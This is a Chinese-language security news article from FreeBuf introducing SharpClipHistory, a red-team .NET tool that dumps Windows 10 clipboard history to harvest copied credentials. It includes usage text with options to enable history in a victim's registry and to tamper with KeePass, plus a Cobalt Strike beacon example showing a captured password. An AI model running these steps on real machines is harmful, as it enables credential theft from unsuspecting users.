**用户有时会复制密码或用户名到剪贴板。所以收集剪贴板历史对攻击者有价值，以便执行诸如横向移动之类的后期开发活动。因此，获取剪贴板历史记录可能很危险，并允许攻击者获取对敏感数据的访问权限。**

但是，Microsoft在Windows 10（build 1809）中引入了一项名为Cloud
Clipboard的新功能：<https://community.windows.com/en-us/stories/cloud-clipboard-windows-10>  

一般获取剪贴板内容的方法通常是监视复制事件并将新剪贴板内容发送给攻击者。但是，这不能访问所有时间段的内容，但用Cloud
Clipboard功能，我们现在可以对UWP
API方法进行简单调用，获取剪切版整个历史记录内容。为了滥用此功能，MWR引入了[SharpClipHistory](a%20href=)。

该工具是用C＃编写的.NET应用程序，可用于检索整个剪贴板历史记录内容以及复制每个条目的日期和时间。从Windows 10 Build
1809开始，该功能已存在，但是由用户决定是否已启用。这可以通过可以使用WIN +
V访问的GUI或通过修改HKEY_CURRENT_USER中的注册表项来完成：

    
    
    C:\Users\user>reg query HKEY_CURRENT_USER\Software\Microsoft\Clipboard /v EnableClipboardHistory
    HKEY_CURRENT_USER\Software\Microsoft\Clipboard
     EnableClipboardHistory REG_DWORD 0x1
    

如果禁用了云历史记录功能，可以使用[SharpClipHistory](a%20href=)通过更改上述注册表项值来启用它。

## 安装步骤

必须在支持剪贴板历史记录功能的Windows 10主机上编译项目（Build 1809以后）。构建项目应该很简单，只需克隆并在Visual
Studio中命中Build。但是，如果缺少程序集，则必须手动添加以下引用：

`C:\Program Files (x86)\Windows
Kits\10\References\10.0.17763.0\Windows.Foundation.UniversalApiContract\7.0.0.0\Windows.Foundation.UniversalApiContract.winmd`

`C:\Program Files (x86)\Windows
Kits\10\References\10.0.17763.0\Windows.Foundation.FoundationContract\3.0.0.0\Windows.Foundation.FoundationContract.winmd`

还必须安装UWPDesktop软件包以处理其他UWP依赖项。CommandLineParser和Costura.Fody也是必需的。
[此处](a%20href=)还可以找到预构建的可执行文件。

## 用法

    
    
    C:\Users\User\Desktop>SharpClipHistory.exe --help
    SharpClipHistory v1.0
    Usage: SharpClipHistory.exe <option>
    Options:
        --checkOnly
            Check if the Clipboard history feature is available and enabled on the target host.
        --enableHistory
            Edit the registry to enable clipboard history for the victim user and get contents.
        --saveImages
            Save any images in clipboard to a file in APPDATA.
        --keepassBypass
            Stops KeePass (if it is running) and modifies the config file. Next time KeePass is launched passwords will be saved in clipboard history.
    

## 例子

    
    
    beacon> execute-assembly /root/SharpClipHistory.exe
    [*] Tasked beacon to run .NET program: SharpClipHistory.exe
    [+] host called home, sent: 224299 bytes
    [+] received output:
    [+] Clipboard history feature is enabled!
    [+] Clipboard history Contents:
    4/25/2019 2:27:11 PM admin
    4/25/2019 2:27:06 PM Sup3rS3cur3Passw0rd123!
    

***参考来源：[github](https://github.com/mwrlabs/SharpClipHistory)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**

